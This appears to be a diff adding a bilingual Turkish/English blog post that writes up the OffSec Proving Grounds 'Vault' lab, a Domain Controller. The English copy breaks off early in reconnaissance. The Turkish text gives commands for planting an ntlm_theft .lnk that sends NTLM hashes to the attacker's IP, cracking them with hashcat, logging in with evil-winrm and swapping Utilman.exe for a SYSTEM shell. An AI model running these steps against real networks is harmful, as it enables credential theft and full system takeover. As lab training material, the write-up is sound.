@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="tr" data-lang="tr" class="no-js">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script>
+    (function () {
+      var r = document.documentElement;
+      r.className = r.className.replace(/\bno-js\b/, '');
+      try {
+        var l = localStorage.getItem('site_lang');
+        if (l === 'en' || l === 'tr') { r.setAttribute('data-lang', l); r.setAttribute('lang', l); }
+      } catch (e) {}
+    })();
+  </script>
+
+  <title>Proving Grounds: Vault — NTLM Hash Yakalama ve SeRestorePrivilege ile SYSTEM — Hüseyin Kalkan</title>
+  <meta name="description" content="Yazılabilir anonim SMB paylaşımına bırakılan .lnk dosyasıyla Net-NTLMv2 yakalama, hashcat ile kırma, WinRM erişimi ve Utilman.exe değişimiyle SYSTEM kabuğu.">
+  <meta name="author" content="Hüseyin Kalkan">
+  <meta name="theme-color" content="#080a0f">
+  <link rel="canonical" href="https://huseyinkalkan.net/blog/pg-vault-writeup/">
+
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="huseyinkalkan.net">
+  <meta property="og:title" content="Proving Grounds: Vault — NTLM Hash Yakalama ve SeRestorePrivilege ile SYSTEM">
+  <meta property="og:description" content="Yazılabilir anonim SMB paylaşımına bırakılan .lnk dosyasıyla Net-NTLMv2 yakalama, hashcat ile kırma, WinRM erişimi ve Utilman.exe değişimiyle SYSTEM kabuğu.">
+  <meta property="og:url" content="https://huseyinkalkan.net/blog/pg-vault-writeup/">
+  <meta property="og:locale" content="tr_TR">
+  <meta property="og:locale:alternate" content="en_US">
+  <meta property="article:published_time" content="2026-11-02">
+  <meta name="twitter:card" content="summary">
+
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="/favicon.ico" sizes="48x48">
+<link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+<link rel="manifest" href="/site.webmanifest">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600;700&display=swap">
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Proving Grounds: Vault — NTLM Hash Yakalama ve SeRestorePrivilege ile SYSTEM",
+    "datePublished": "2026-11-02",
+    "dateModified": "2026-11-02",
+    "inLanguage": "tr",
+    "author": { "@type": "Person", "name": "Hüseyin Kalkan", "url": "https://huseyinkalkan.net/" },
+    "mainEntityOfPage": "https://huseyinkalkan.net/blog/pg-vault-writeup/"
+  }
+  </script>
+</head>
+<body>
+
+  <a class="skip-link" href="#main"><span class="t-tr">İçeriğe atla</span><span class="t-en" lang="en">Skip to content</span></a>
+
+  <header class="site-header">
+    <div class="container">
+      <nav class="nav" aria-label="Ana menü">
+        <a href="/" class="logo">
+          <svg class="logo-mark" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round" aria-hidden="true">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+          <span>huseyinkalkan.net</span><span class="caret" aria-hidden="true">_</span>
+        </a>
+
+        <button class="nav-toggle" type="button" id="nav-toggle" aria-expanded="false" aria-controls="nav-links" aria-label="Menü">
+          <svg class="icon-open" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+          <svg class="icon-close" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>
+        </button>
+
+        <div class="nav-links" id="nav-links">
+          <a href="/"><span class="t-tr">Hakkımda</span><span class="t-en" lang="en">About</span></a>
+          <a href="/pentest.html">Pentest</a>
+          <a href="/oscp-ultimate-guide/">OSCP Ultimate Guide</a>
+          <a href="/bug-bounty.html">Bug Bounty</a>
+          <a href="/blog/" aria-current="page">Blog</a>
+          <button id="lang-btn" class="lang-btn" type="button">TR</button>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main id="main">
+    <div class="container">
+
+      <!-- ===================== Türkçe ===================== -->
+      <article class="article t-tr">
+        <a class="back-link" href="/blog/">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m15 18-6-6 6-6"/></svg>
+          Tüm yazılar
+        </a>
+
+        <div class="post-meta">
+          <time datetime="2026-11-02">2 Kasım 2026</time>
+            <span class="badge">PG Practice / AD</span>
+        </div>
+
+        <h1>Proving Grounds: Vault — NTLM Hash Yakalama ve SeRestorePrivilege ile SYSTEM</h1>
+
+        <p>Yazılabilir anonim SMB paylaşımına bırakılan .lnk dosyasıyla Net-NTLMv2 yakalama, hashcat ile kırma, WinRM erişimi ve Utilman.exe değişimiyle SYSTEM kabuğu.</p>
+
+        <div class="table-wrap">
+          <table>
+            <tbody>
+              <tr><td>Makine</td><td>Vault (<code>192.168.154.172</code>, domain <code>vault.offsec</code>)</td></tr>
+              <tr><td>Platform</td><td>OffSec Proving Grounds Practice</td></tr>
+              <tr><td>İşletim sistemi / rol</td><td>Windows Server 2019 (build 17763), Domain Controller</td></tr>
+              <tr><td>İlk erişim</td><td>Anonim yazılabilir SMB paylaşımı → zorla NTLM kimlik doğrulaması</td></tr>
+              <tr><td>Yetki yükseltme</td><td><code>SeRestorePrivilege</code> → RDP üzerinden Utilman.exe değişimi</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h2>Saldırı zinciri özeti</h2>
+        <ol>
+          <li>Nmap; SMB, LDAP, WinRM ve RDP açık bir Domain Controller gösteriyor.</li>
+          <li>RPC üzerinden anonim oturum reddediliyor, ancak <code>DocumentsShare</code> paylaşımına <strong>anonim olarak yazılabiliyor</strong>.</li>
+          <li><code>ntlm_theft</code> ile hazırlanan zararlı <code>.lnk</code> dosyası paylaşıma bırakılıyor. Klasöre bakan kullanıcı bizim makinemize kimlik doğrulaması yapıyor ve Responder <code>anirudh</code> kullanıcısının Net-NTLMv2 hash'ini yakalıyor.</li>
+          <li>Hashcat, hash'i <code>rockyou.txt</code> ile saniyeler içinde kırıyor; <code>evil-winrm</code> ile WinRM'e giriyoruz.</li>
+          <li><code>whoami /priv</code> çıktısında <code>SeRestorePrivilege</code> var: <code>Utilman.exe</code> yerine <code>cmd.exe</code> koyup RDP giriş ekranında Win+U'ya basarak <code>NT AUTHORITY\SYSTEM</code> kabuğu alıyoruz.</li>
+        </ol>
+
+        <h2>1. Keşif</h2>
+        <pre><code>sudo nmap -sC -sV -Pn -p- -T4 192.168.154.172 --open</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/01-nmap.png" alt="Nmap çıktısı: DNS, Kerberos, LDAP, SMB, RDP ve WinRM portları açık" width="942" height="984" loading="lazy">
+          <figcaption>Tam port taraması: hedef <code>DC.vault.offsec</code> adlı Domain Controller.</figcaption>
+        </figure>
+
+        <p>Açık portlar ve bizim için ne anlama geldikleri:</p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Port</th><th>Servis</th><th>Neden önemli</th></tr></thead>
+            <tbody>
+              <tr><td>53</td><td>DNS</td><td>Alan adlarını IP adreslerine çevirir; DC'de domain bölgesini sunar.</td></tr>
+              <tr><td>88 / 464</td><td>Kerberos / kpasswd</td><td>Active Directory'nin birincil kimlik doğrulama protokolü.</td></tr>
+              <tr><td>135, 139, 445</td><td>RPC / SMB</td><td>Dosya paylaşımı ve uzak yönetim. Giriş noktamız burası.</td></tr>
+              <tr><td>389 / 3268</td><td>LDAP / Global Catalog</td><td>AD nesnelerini (kullanıcılar, gruplar vb.) sorgulamak için kullanılan dizin hizmeti.</td></tr>
+              <tr><td>3389</td><td>RDP</td><td>Uzak Masaüstü. Yetki yükseltmede tekrar kullanacağız.</td></tr>
+              <tr><td>5985</td><td>WinRM</td><td>Uzak PowerShell. Parolayı bulduğumuzda kabuğumuz bu olacak.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Taramadaki iki ayrıntı ileride önem kazanıyor: <strong>WinRM (5985) açık</strong>, yani kırılan bir parola doğrudan kabuğa dönüşür. SMB'de <strong>imzalama (signing) "enabled and required"</strong> durumda olduğu için bu makineye NTLM relay saldırısı yapılamaz; yakalanan hash'i <em>kırmamız</em> gerekecek.</p>
+
+        <p>Domain'i <code>/etc/hosts</code> dosyasına ekleyip DC ile saat farkını kontrol ettim:</p>
+        <pre><code>echo "192.168.154.172 vault.offsec" | sudo tee -a /etc/hosts
+sudo ntpdig 192.168.154.172</code></pre>
+        <div class="callout callout-info">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+          <p>Kerberos, saat farkı 5 dakikayı aşarsa istekleri reddeder. <code>ntpdig &lt;IP&gt;</code> tek başına farkı sadece <strong>gösterir</strong>; saati gerçekten ayarlamak için <code>sudo ntpdig -S &lt;IP&gt;</code> (ya da <code>sudo ntpdate &lt;IP&gt;</code>) gerekir. Bu zincirde sonunda Kerberos kullanılmıyor (WinRM NTLM'e düşüyor), ama AD makinelerinde saati önceden eşitlemek iyi bir alışkanlık.</p>
+        </div>
+
+        <h2>2. Anonim erişim denemeleri</h2>
+        <p>Kimlik bilgisi olmadan (boş kullanıcı adı ve parola, <code>-U '' -N</code>) kullanıcı listesi çekmeyi denedim ve <code>enum4linux</code> çalıştırdım:</p>
+        <pre><code>rpcclient -U '' -N 192.168.154.172
+enum4linux 192.168.154.172</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/04-rpcclient-enum4linux.png" alt="rpcclient NT_STATUS_ACCESS_DENIED döndürüyor, enum4linux duruyor" width="922" height="630" loading="lazy">
+          <figcaption>RPC üzerinden anonim oturum reddediliyor; <code>enum4linux</code> oturum kontrolünden sonra duruyor.</figcaption>
+        </figure>
+        <p><code>NT_STATUS_ACCESS_DENIED</code>, sunucunun RPC tarafında anonim (boş kullanıcı adı ve parolalı) oturumları reddettiği anlamına gelir; buradan kullanıcı listesi çıkmıyor. SMB paylaşımlarını listelemek ise hâlâ mümkün:</p>
+        <pre><code>smbclient -L //192.168.154.172 -N</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/05-smb-shares.png" alt="Paylaşım listesi: ADMIN$, C$, DocumentsShare, IPC$, NETLOGON, SYSVOL" width="842" height="272" loading="lazy">
+          <figcaption>Varsayılan paylaşımların yanında standart olmayan bir <code>DocumentsShare</code> var.</figcaption>
+        </figure>
+        <p><code>DocumentsShare</code> anonim olarak açılıyor ama boş. <code>NETLOGON</code> ve <code>SYSVOL</code>'da bağlantı kuruluyor, fakat <code>ls</code> komutu <code>NT_STATUS_ACCESS_DENIED</code> döndürüyor: anonim oturum paylaşıma bağlanabiliyor ama içini listeleme ya da okuma yetkisi yok.</p>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/07-netlogon-sysvol.png" alt="NETLOGON ve SYSVOL listelemesi NT_STATUS_ACCESS_DENIED ile başarısız" width="480" height="245" loading="lazy">
+          <figcaption>Bağlantıya izin var, listelemeye yok.</figcaption>
+        </figure>
+
+        <h2>3. Kaçırılmaması gereken nokta: paylaşıma yazabiliyor muyuz?</h2>
+        <p>Boş ve standart olmayan bir paylaşım çoğu zaman bir kullanıcının ya da zamanlanmış bir görevin baktığı bir "bırakma kutusu"dur. Sadece okumakla yetinmeyip <strong>yazma</strong> iznini test ettim:</p>
+        <pre><code>echo test &gt; test.txt
+smbclient //192.168.154.172/DocumentsShare -N -c 'put test.txt'</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/08-upload-test.png" alt="test.txt DocumentsShare'e başarıyla yüklendi" width="668" height="223" loading="lazy">
+          <figcaption>Anonim olarak dosya yükleyebiliyoruz. Giriş noktası bu.</figcaption>
+        </figure>
+
+        <h2>4. Neden işe yarıyor: NTLM ve zorla kimlik doğrulama</h2>
+        <p><strong>NTLM</strong> (NT LAN Manager), Microsoft'un eski kimlik doğrulama protokol ailesidir. Modern domain'lerde öncelik Kerberos'tadır, ama NTLM uyumluluk için açık kalır ve bir istemci bir kaynağa <strong>IP adresiyle</strong> bağlandığında hâlâ kullanılır.</p>
+        <ul>
+          <li><strong>NT hash:</strong> Windows parolaları düz metin olarak saklamaz. <em>NT hash</em>, parolanın UTF-16LE kodlanmış hâlinin MD4 özetidir; DC'de bu hash'ler <code>ntds.dit</code> dosyasında tutulur.</li>
+          <li><strong>Challenge-response (sınama-yanıt):</strong> sunucu rastgele bir <em>challenge</em> gönderir; istemci bu challenge ve kendi NT hash'inden bir <em>response</em> hesaplayıp geri yollar. Parolanın kendisi ağda hiç dolaşmaz.</li>
+          <li><strong>Zayıf nokta:</strong> istemci, kime kimlik doğruladığını sorgulamaz. Windows <code>\\SALDIRGAN_IP\paylasim\…</code> gibi bir yola dokunduğunda, oturum açmış kullanıcının NTLM yanıtını karşısına çıkan sunucuya otomatik olarak gönderir.</li>
+        </ul>
+        <p>Yakaladığımız şey bir <strong>Net-NTLMv2</strong> yanıtıdır. Bu, NT hash'in kendisi değildir, dolayısıyla pass-the-hash için <em>kullanılamaz</em>. Ya çevrimdışı kırılır (hashcat ve kelime listesi) ya da başka bir servise relay edilir. Burada SMB imzalama zorunlu olduğu için relay seçeneği yok, geriye kırmak kalıyor.</p>
+        <p>Plan:</p>
+        <ol>
+          <li>Simge yolu kendi IP'mizi gösteren bir kısayol (<code>.lnk</code>) dosyası hazırlamak.</li>
+          <li>Kendi makinemizde sahte bir SMB sunucusu açmak.</li>
+          <li><code>.lnk</code> dosyasını yazılabilir paylaşıma bırakmak.</li>
+          <li>Bir kullanıcı (ya da onu taklit eden bir bot) klasörü açtığında Explorer simgeyi yüklemek için bize bağlanır ve hash'i yakalarız.</li>
+        </ol>
+
+        <h2>5. Tuzak dosyayı hazırlamak: ntlm_theft</h2>
+        <p><a href="https://github.com/Greenwolf/ntlm_theft" rel="noopener" target="_blank">ntlm_theft</a>, NTLM kimlik doğrulamasını tetikleyen birçok formatta (<code>.lnk</code>, <code>.url</code>, <code>.scf</code>, <code>.docx</code>, …) tuzak dosya üretir. Windows Explorer'da güvenilir bir tetikleyici olduğu için <code>.lnk</code> kullandım. Daha fazla durumu kapsamak için <code>-g all</code> ile tüm formatlar tek seferde üretilebilir.</p>
+        <pre><code># -s KENDİ tun0 IP'miz olmalı, hedefinki değil
+python3 ntlm_theft.py -g lnk -s 192.168.45.160 -f vault</code></pre>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Parametre</th><th>Anlamı</th></tr></thead>
+            <tbody>
+              <tr><td><code>-g lnk</code> (<code>--generate</code>)</td><td>Üretilecek tuzak dosyanın türü. Burada bir Windows kısayolu.</td></tr>
+              <tr><td><code>-s 192.168.45.160</code> (<code>--server</code>)</td><td>Kurbanın bağlanacağı IP: sahte SMB sunucusunun dinlediği <strong>kendi</strong> VPN (tun0) adresimiz.</td></tr>
+              <tr><td><code>-f vault</code> (<code>--filename</code>)</td><td>Çıktı adı. <code>vault/vault.lnk</code> dosyası oluşur.</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/09-ntlm-theft.png" alt="ntlm_theft vault/vault.lnk dosyasını oluşturuyor" width="738" height="330" loading="lazy">
+          <figcaption>İlk denemem: burada <code>-s</code> parametresine <strong>hedefin</strong> IP'si (<code>192.168.154.172</code>) yazılmış. Bu yanlış.</figcaption>
+        </figure>
+        <div class="callout">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 9v4M12 17h.01"/><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"/></svg>
+          <p><strong>Sık yapılan hata:</strong> <code>-s</code> hedefin adresi değil, <em>senin</em> dinlediğin adrestir. Hedefi gösteren bir <code>.lnk</code> dosyası kurbanın kendine kimlik doğrulamaya çalışmasına yol açar ve dinleyicine hiçbir şey düşmez. IP'ni <code>ip -4 addr show tun0</code> ile kontrol et.</p>
+        </div>
+
+        <h2>6. Dinleyici: impacket-smbserver mı, Responder mı?</h2>
+        <p>İlk denemem <code>impacket-smbserver</code> oldu ve hash gelmedi:</p>
+        <pre><code>impacket-smbserver test . -smb2support</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/10-impacket-smbserver.png" alt="impacket-smbserver başlatıldı, gelen bağlantı yok" width="644" height="132" loading="lazy">
+          <figcaption>Sunucu açılıyor ama bağlantı gelmiyor.</figcaption>
+        </figure>
+        <p>Responder ile dosyayı tekrar yükleyince hash düştü:</p>
+        <pre><code>sudo responder -I tun0
+smbclient //192.168.154.172/DocumentsShare -N -c 'put vault.lnk'</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/11-put-lnk.png" alt="vault.lnk DocumentsShare'e yüklendi" width="630" height="143" loading="lazy">
+        </figure>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/12-responder-hash.png" alt="Responder VAULT\anirudh için NTLMv2-SSP hash'ini yakalıyor" width="910" height="286" loading="lazy">
+          <figcaption>Responder, <code>VAULT\anirudh</code> kullanıcısının Net-NTLMv2 hash'ini yakaladı.</figcaption>
+        </figure>
+        <div class="callout callout-info">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+          <p><strong>Peki impacket neden çalışmadı?</strong> Notlarımda önce paylaşım adı uyuşmazlığını ve LLMNR zehirlemesini sebep göstermiştim. İkisi de doğru değil. NTLM kimlik doğrulaması SMB'nin <em>oturum kurma</em> (session setup) aşamasında, paylaşım adına bakılmadan önce gerçekleşir; yani <code>impacket-smbserver</code> paylaşımın adı ne olursa olsun hash'i ekrana basar. LLMNR/NBT-NS zehirlemesi yayın (broadcast) isim sorgularında işe yarar, VPN'i geçmez ve kurban doğrudan bir IP'ye bağlanırken gerekmez. <code>-smb2support</code> da zaten verilmişti. En olası sebepler şunlar: <code>.lnk</code> hâlâ yanlış IP'yi gösteriyordu (bir önceki bölüm) ya da hedefteki bot paylaşıma birkaç dakikada bir bakıyor ve sunucu o anı beklemeden kapatıldı. Bu saldırı için iki araç da çalışır; yeter ki tuzak senin IP'ni göstersin ve yeterince bekle.</p>
+        </div>
+
+        <h2>7. Hash'i kırmak</h2>
+        <p>Hash biçimi <code>kullanıcı::DOMAIN:challenge:NTProofStr:blob</code>; hashcat modu <code>5600</code> (NetNTLMv2):</p>
+        <pre><code>echo 'anirudh::VAULT:2227191f219be214:…' &gt; hash.txt
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/14-hashcat-cracked.png" alt="hashcat Status: Cracked, parola SecureHM" width="1165" height="643" loading="lazy">
+          <figcaption>Birkaç saniyede kırıldı: <code>anirudh : SecureHM</code>.</figcaption>
+        </figure>
+
+        <h2>8. İlk erişim: WinRM</h2>
+        <p>5985 portu açık olduğu için kimlik bilgileri doğrudan bir PowerShell oturumuna dönüşüyor:</p>
+        <pre><code>evil-winrm -i 192.168.154.172 -u anirudh -p 'SecureHM'</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/15-evil-winrm.png" alt="anirudh olarak evil-winrm oturumu" width="972" height="298" loading="lazy">
+        </figure>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/16-local-txt.png" alt="anirudh masaüstündeki local.txt (bayrak gizlendi)" width="929" height="367" loading="lazy">
+          <figcaption><code>local.txt</code>, <code>C:\Users\anirudh\Desktop</code> içinde (bayrak gizlendi).</figcaption>
+        </figure>
+
+        <h2>9. Yetki yükseltme: SeRestorePrivilege</h2>
+        <pre><code>whoami /priv</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/17-whoami-priv.png" alt="whoami /priv: SeBackupPrivilege ve SeRestorePrivilege etkin" width="720" height="312" loading="lazy">
+          <figcaption><code>SeBackupPrivilege</code> ve <code>SeRestorePrivilege</code> dahil birçok tehlikeli yetki <strong>Enabled</strong> durumda.</figcaption>
+        </figure>
+        <p>Buradan birden fazla yol açılıyor. En basiti olduğu için <code>SeRestorePrivilege</code>'i seçtim:</p>
+        <ul>
+          <li><strong>Ne sağlar:</strong> <code>SeRestorePrivilege</code> yedeklerin geri yüklenebilmesi için vardır ve sahibine, ACL'den bağımsız olarak herhangi bir dosyaya <strong>yazma ve onu değiştirme</strong> imkânı verir. (ACL'leri atlayarak her dosyayı <em>okumak</em> ise <code>SeBackupPrivilege</code>'in işidir.)</li>
+          <li><strong>Utilman.exe:</strong> giriş ekranında <strong>Win+U</strong>'ya ya da Erişim Kolaylığı simgesine basınca <code>C:\Windows\System32\Utilman.exe</code> çalışır. Giriş ekranında henüz oturum açmış bir kullanıcı olmadığı için Winlogon bu programı <code>NT AUTHORITY\SYSTEM</code> olarak başlatır.</li>
+          <li><strong>Fikir:</strong> <code>Utilman.exe</code>'nin yerine <code>cmd.exe</code> koyarsak, Win+U bize SYSTEM yetkili bir komut satırı açar.</li>
+        </ul>
+        <pre><code>cd C:\Windows\System32
+ren Utilman.exe Utilman.old
+ren cmd.exe Utilman.exe</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/18-utilman-swap.png" alt="System32 içinde Utilman.exe ve cmd.exe yeniden adlandırılıyor" width="689" height="106" loading="lazy">
+        </figure>
+        <p>Ardından RDP'ye bağlandım ama oturum açmadım; sadece giriş ekranı gerekiyordu:</p>
+        <pre><code>rdesktop 192.168.154.172</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/19-rdp-login.png" alt="RDP üzerinden Windows giriş ekranı" width="1028" height="797" loading="lazy">
+          <figcaption>Giriş ekranında Win+U'ya bas.</figcaption>
+        </figure>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/20-system-shell.png" alt="Giriş ekranında utilman.exe yerine çalışan cmd.exe" width="1020" height="805" loading="lazy">
+          <figcaption>Erişim Kolaylığı yerine SYSTEM yetkili <code>cmd.exe</code> açılıyor.</figcaption>
+        </figure>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/21-proof-txt.png" alt="Administrator masaüstündeki proof.txt (bayrak gizlendi)" width="613" height="151" loading="lazy">
+          <figcaption><code>proof.txt</code>, <code>C:\Users\Administrator\Desktop</code> içinde (bayrak gizlendi).</figcaption>
+        </figure>
+
+        <div class="callout callout-info">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+          <p><strong>Temizlik.</strong> Yukarıdaki komutlar sistemi <code>cmd.exe</code>'siz bırakır. Lab'da sorun değil, ama gerçek bir testte iş bitince dosyaları geri al: önce <code>ren Utilman.exe cmd.exe</code>, sonra <code>ren Utilman.old Utilman.exe</code>. Ayrıca bir yetki <code>whoami /priv</code> çıktısında <em>Disabled</em> görünüyorsa önce etkinleştirilmesi gerekir (örneğin <code>EnableSeRestorePrivilege.ps1</code> betiğiyle). Vault'ta zaten <em>Enabled</em> durumdaydı.</p>
+        </div>
+
+        <h2>Alternatif yollar</h2>
+        <ul>
+          <li><strong>SeBackupPrivilege:</strong> aynı hesap her dosyayı okuyabiliyor da. DC'de bu, <code>diskshadow</code> ile gölge kopya alıp <code>robocopy /b</code> ile <code>ntds.dit</code> dosyasını kopyalamak ve <code>impacket-secretsdump</code> ile tüm domain hash'lerini dökmek anlamına gelir.</li>
+          <li><strong>AD izinleri:</strong> BloodHound ile veri toplayıp <code>anirudh</code>'un hangi nesneler üzerinde hakkı olduğuna (ör. Group Policy nesneleri) bakmak da denemeye değer. Yayınlanmış writeup'lardan birinde ikinci bir teknik anlatılıyor; onu henüz denemedim.</li>
+        </ul>
+
+        <h2>Çıkarımlar</h2>
+        <ul>
+          <li>Anonim bir paylaşımda sadece okumayı değil, <strong>yazmayı da test et</strong>. Boş ve standart dışı bir paylaşım çoğu zaman birinin izlediği bir bırakma kutusudur.</li>
+          <li><code>ntlm_theft</code>'te ve her tuzak dosyada adres hedefin değil, <strong>senin</strong> adresin.</li>
+          <li>Bir araç "çalışmadığında" sıradakine geçmeden önce nedenini bul: zamanlama, IP, protokol.</li>
+          <li>Nmap çıktısını iki kez oku: <em>signing required</em> relay'i eler; açık 5985 portu, kırılan parolanın nasıl kabuğa dönüşeceğini söyler.</li>
+          <li><code>SeBackup</code>/<code>SeRestore</code> türü yetkiler tek başlarına fiilen yönetici yetkisidir.</li>
+        </ul>
+
+        <h2>Kaynaklar</h2>
+        <ul>
+          <li><a href="https://medium.com/@Tvrpism/vault-proving-grounds-walkthrough-73bac067c13c" rel="noopener" target="_blank">Vault — Proving Grounds Walkthrough (Medium, @Tvrpism)</a></li>
+          <li><a href="https://github.com/Greenwolf/ntlm_theft" rel="noopener" target="_blank">Greenwolf/ntlm_theft</a></li>
+          <li><a href="https://github.com/lgandx/Responder" rel="noopener" target="_blank">lgandx/Responder</a></li>
+        </ul>
+      </article>
+
+      <!-- ===================== English ===================== -->
+      <article class="article t-en" lang="en">
+        <a class="back-link" href="/blog/">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m15 18-6-6 6-6"/></svg>
+          All posts
+        </a>
+
+        <div class="post-meta">
+          <time datetime="2026-11-02">November 2, 2026</time>
+            <span class="badge">PG Practice / AD</span>
+        </div>
+
+        <h1>Proving Grounds: Vault — NTLM Theft and SeRestorePrivilege to SYSTEM</h1>
+
+        <p>Capturing a Net-NTLMv2 hash with a .lnk dropped on a writable anonymous SMB share, cracking it, WinRM access, and a SYSTEM shell via the Utilman.exe swap.</p>
+
+        <div class="table-wrap">
+          <table>
+            <tbody>
+              <tr><td>Machine</td><td>Vault (<code>192.168.154.172</code>, domain <code>vault.offsec</code>)</td></tr>
+              <tr><td>Platform</td><td>OffSec Proving Grounds Practice</td></tr>
+              <tr><td>OS / role</td><td>Windows Server 2019 (build 17763), Domain Controller</td></tr>
+              <tr><td>Foothold</td><td>Writable anonymous SMB share → forced NTLM authentication</td></tr>
+              <tr><td>Privilege escalation</td><td><code>SeRestorePrivilege</code> → Utilman.exe swap over RDP</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h2>Attack chain at a glance</h2>
+        <ol>
+          <li>Nmap shows a Domain Controller with SMB, LDAP, WinRM and RDP open.</li>
+          <li>Null sessions over RPC are refused, but the <code>DocumentsShare</code> share is <strong>writable anonymously</strong>.</li>
+          <li>A malicious <code>.lnk</code> file built with <code>ntlm_theft</code> is dropped on the share; a user browsing it authenticates to our machine and Responder captures the <code>anirudh</code> Net-NTLMv2 hash.</li>
+          <li>Hashcat cracks the hash with <code>rockyou.txt</code> in seconds and we log in over WinRM with <code>evil-winrm</code>.</li>
+          <li><code>whoami /priv</code> shows <code>SeRestorePrivilege</code>: we replace <code>Utilman.exe</code> with <code>cmd.exe</code> and press Win+U on the RDP login screen to get a <code>NT AUTHORITY\SYSTEM</code> shell.</li>
+        </ol>
+
+        <h2>1. Reconnaissance</h2>
+        <pre><code>sudo nmap -sC -sV -Pn -p- -T4 192.168.154.172 --open</code></pre>
+        <figure class="shot">
+          <img src="/blog/pg-vault-writeup/img/01-nmap.png" alt="Nmap output: DNS, Kerberos, LDAP, SMB, RDP and WinRM ports open" width="942" height="984" loading="lazy">
+          <figcaption>Full port scan: the host is the <code>DC.vault.offsec</code> Domain Controller.</figcaption>
+        </figure>
+
+        <p>The open ports, and what each one means for us:</p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Port</th><th>Service</th><th>Why it matters</th></tr></thead>
+            <tbody>
+              <tr><td>53</td><td>DNS</td><td>Resolves names to IP addresses; on a DC it serves the domain zone.</td></tr>
+              <tr><td>88 / 464</td><td>Kerberos / kpasswd</td><td>The primary authentication protocol in Active Directory.</td></tr>
+              <tr><td>135, 139, 445</td><td>RPC / SMB</td><td>File sharing and remote management. This is our way in.</td></tr>
+              <tr><td>389 / 3268</td><td>LDAP / Global Catalog</td><td>Directory service used to query AD objects (users, groups and so on).</td></tr>
+              <tr><td>3389</td><td>RDP</td><td>Remote Desktop. We use it again for privilege escalation.</td></tr>
+              <tr><td>5985</td><td>WinRM</td><td>Remote PowerShell. Once we have a password, this is our shell.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Two details from the scan matter later: <strong>WinRM (5985) is open</strong>, so cracked credentials turn straight into a shell, and SMB <strong>message signing is "enabled and required"</strong>. Because signing is required, an NTLM relay attack against this host will not work, so a captured hash has to be <em>cracked</em>.</p>
+
+        <p>I added the domain to <code>/etc/hosts</code> and checked the time offset against the DC:</p>
+        <pre><code>echo "192.168.154.172 vault.offsec" | sudo tee -a /etc/hosts
+sudo ntpdig 192.168.154.172</code></pre>
+        <div class="callout callout-info">
